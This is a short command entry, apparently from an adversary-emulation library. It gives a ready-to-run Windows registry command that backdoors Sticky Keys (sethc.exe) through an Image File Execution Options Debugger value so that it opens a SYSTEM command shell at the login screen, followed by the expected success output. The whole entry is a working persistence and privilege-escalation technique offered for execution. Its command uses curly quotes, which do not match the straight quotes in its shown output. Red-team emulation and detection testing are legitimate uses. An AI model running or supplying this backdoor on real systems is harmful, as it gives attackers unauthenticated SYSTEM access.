---
id: ffeae695-f7df-4e42-a8cb-1f95ea235fc3
name: Backdoor Sticky Keys to Launch a SYSTEM Shell
type: command
executor: command_prompt
data: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution
  Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
output: 'C:\Windows\system32>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
  File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe"
  /f

  The operation completed successfully.'
created_at: '2020-04-03T08:54:04.304648+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Backdoor Sticky Keys to Launch a SYSTEM Shell

```command_prompt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
```

## Expected Output

```
C:\Windows\system32>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
The operation completed successfully.
```
